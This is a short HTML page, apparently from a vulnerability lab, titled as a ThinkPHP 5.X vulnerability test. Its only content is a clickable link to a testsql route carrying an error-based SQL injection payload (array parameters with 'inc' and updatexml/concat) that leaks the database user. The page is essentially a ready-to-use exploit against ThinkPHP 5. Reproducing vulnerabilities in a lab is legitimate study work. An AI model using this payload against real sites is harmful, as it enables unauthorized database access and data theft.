
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    	<meta name="viewport" content="width=device-width, initial-scale=1"/>
    	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    	<title>ThinkPHP 5.X 漏洞测试</title>
	</head>
	<body>
		<p>
			<h1>点击测试</h1>
			<a href="/public/index.php/index/index/testsql?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1" target="_blank">/public/index.php/index/index/testsql?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</a>
		</p>
	</body>
</html>
